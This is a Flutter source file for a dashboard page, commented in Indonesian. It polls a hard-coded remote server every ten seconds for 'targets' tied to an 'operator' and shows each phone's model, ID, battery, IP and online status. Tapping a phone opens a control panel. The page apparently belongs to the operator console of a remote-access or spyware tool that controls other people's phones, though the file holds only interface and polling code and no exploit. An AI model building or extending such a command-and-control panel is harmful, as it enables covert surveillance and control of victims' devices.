import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';

class DeviceDashboardPage extends StatefulWidget {
  // DITAMBAHKAN: Menerima username agar bisa memfilter target milik "mizuki"
  final String username; 

  const DeviceDashboardPage({super.key, required this.username});

  @override
  State<DeviceDashboardPage> createState() => _DeviceDashboardPageState();
}

class _DeviceDashboardPageState extends State<DeviceDashboardPage> {
  List<dynamic> _devices = [];
  bool _isLoading = true;
  Timer? _timer;

  @override
  void initState() {
    super.initState();
    _fetchDevices();
    _timer = Timer.periodic(const Duration(seconds: 10), (timer) => _fetchDevices());
  }

  @override
  void dispose() {
    _timer?.cancel();
    super.dispose();
  }

  Future<void> _fetchDevices() async {
    try {
      // PERBAIKAN: Menyertakan parameter username agar ID di targets.json terdeteksi
      final response = await http.get(
        Uri.parse("http://guntur-jier.hoshino.my.id:10556/api/list-targets?username=${widget.username}"),
      );

      if (response.statusCode == 200) {
        if (mounted) {
          setState(() {
            _devices = jsonDecode(response.body);
            _isLoading = false;
          });
        }
      }
    } catch (e) {
      debugPrint("Error fetching devices: $e");
    }
  }

  @override
  Widget build(BuildContext context) {
    // Menghitung device aktif berdasarkan status real
    int activeCount = _devices.where((d) => d['status'] == "Online").length; 

    return Scaffold(
      backgroundColor: const Color(0xFF0A0C10), 
      body: SafeArea(
        child: Stack(
          children: [
            Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                // --- TOP HEADER MATRIX ---
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 15),
                  decoration: BoxDecoration(
                    color: const Color(0xFF12161E),
                    borderRadius: const BorderRadius.only(
                      bottomLeft: Radius.circular(20),
                      bottomRight: Radius.circular(20),
                    ),
                    border: Border(bottom: BorderSide(color: Colors.green.withOpacity(0.2))),
                  ),
                  child: Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          const Text("MY ACTIVE TARGETS", style: TextStyle(color: Colors.green, fontSize: 8, letterSpacing: 1)),
                          const SizedBox(height: 4),
                          Text("$activeCount", style: const TextStyle(color: Colors.greenAccent, fontSize: 20, fontWeight: FontWeight.bold)),
                        ],
                      ),
                      GestureDetector(
                        onTap: _fetchDevices,
                        child: Icon(Icons.radar, color: Colors.greenAccent.withOpacity(0.8), size: 30),
                      ),
                      Column(
                        crossAxisAlignment: CrossAxisAlignment.end,
                        children: [
                          const Text("OPERATOR", style: TextStyle(color: Colors.white54, fontSize: 8, letterSpacing: 1)),
                          const SizedBox(height: 4),
                          // Menampilkan nama admin aktif dari config/context
                          Text(widget.username.toUpperCase(), style: const TextStyle(color: Colors.greenAccent, fontSize: 14, fontWeight: FontWeight.bold)),
                        ],
                      ),
                    ],
                  ),
                ),
                
                const SizedBox(height: 15),
                
                Padding(
                  padding: const EdgeInsets.symmetric(horizontal: 20),
                  child: Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      const Text(
                        "CONNECTED DEVICES", 
                        style: TextStyle(color: Colors.greenAccent, fontSize: 12, fontWeight: FontWeight.bold, letterSpacing: 1.5)
                      ),
                      GestureDetector(
                        onTap: () => Navigator.pop(context), 
                        child: const Icon(Icons.close, color: Colors.redAccent, size: 18),
                      )
                    ],
                  ),
                ),
                
                const SizedBox(height: 10),

                Expanded(
                  child: _isLoading 
                    ? const Center(child: CircularProgressIndicator(color: Colors.greenAccent))
                    : _devices.isEmpty 
                      ? const Center(
                          child: Text("NO TARGETS FOUND FOR THIS OPERATOR", 
                          style: TextStyle(color: Colors.green, fontWeight: FontWeight.bold, letterSpacing: 2)))
                      : GridView.builder(
                          padding: const EdgeInsets.symmetric(horizontal: 15, vertical: 10),
                          gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                            crossAxisCount: 3, 
                            crossAxisSpacing: 8,
                            mainAxisSpacing: 8,
                            childAspectRatio: 0.75, 
                          ),
                          itemCount: _devices.length,
                          itemBuilder: (context, index) {
                            final device = _devices[index];
                            bool isActive = device['status'] == "Online"; 
                            Color statusColor = isActive ? Colors.greenAccent : Colors.redAccent;

                            return GestureDetector(
                              onTap: () {
                                // PERBAIKAN: Mengirim Map lengkap (device + operator) agar Control Panel tidak error
                                Navigator.pushNamed(
                                  context, 
                                  '/control_panel', 
                                  arguments: {
                                    "device": device,
                                    "operator": widget.username
                                  } 
                                );
                              },
                              child: Container(
                                padding: const EdgeInsets.all(8),
                                decoration: BoxDecoration(
                                  color: const Color(0xFF0F1116),
                                  borderRadius: BorderRadius.circular(12),
                                  border: Border.all(
                                    color: isActive ? Colors.greenAccent.withOpacity(0.5) : Colors.white12,
                                    width: 1,
                                  ),
                                ),
                                child: Column(
                                  crossAxisAlignment: CrossAxisAlignment.start,
                                  children: [
                                    Row(
                                      mainAxisAlignment: MainAxisAlignment.spaceBetween,
                                      children: [
                                        const Icon(Icons.phone_android, color: Colors.white54, size: 14),
                                        Container(
                                          padding: const EdgeInsets.symmetric(horizontal: 4, vertical: 2),
                                          decoration: BoxDecoration(
                                            border: Border.all(color: statusColor.withOpacity(0.5)),
                                            borderRadius: BorderRadius.circular(8),
                                          ),
                                          child: CircleAvatar(radius: 2.5, backgroundColor: statusColor),
                                        ),
                                      ],
                                    ),
                                    
                                    const Spacer(),
                                    
                                    Text(
                                      device['model'] ?? "Unknown",
                                      style: const TextStyle(color: Colors.greenAccent, fontSize: 10, fontWeight: FontWeight.bold),
                                      maxLines: 1,
                                      overflow: TextOverflow.ellipsis,
                                    ),
                                    const SizedBox(height: 2),
                                    Text(
                                      device['id'] ?? "NO-ID",
                                      style: const TextStyle(color: Colors.white24, fontSize: 7),
                                      maxLines: 1,
                                      overflow: TextOverflow.ellipsis,
                                    ),
                                    
                                    const Spacer(),
                                    
                                    Row(
                                      children: [
                                        const Icon(Icons.battery_charging_full, color: Colors.white54, size: 10),
                                        const SizedBox(width: 2),
                                        Text(
                                          "${device['battery'] ?? '0'}%", 
                                          style: const TextStyle(color: Colors.white70, fontSize: 8, fontWeight: FontWeight.bold)
                                        ),
                                      ],
                                    ),
                                    const SizedBox(height: 4),
                                    Text(
                                      "IP: ${device['ip'] ?? 'Hidden'}", 
                                      style: const TextStyle(color: Colors.white24, fontSize: 6),
                                      maxLines: 1,
                                    ),
                                  ],
                                ),
                              ),
                            );
                          },
                        ),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }
}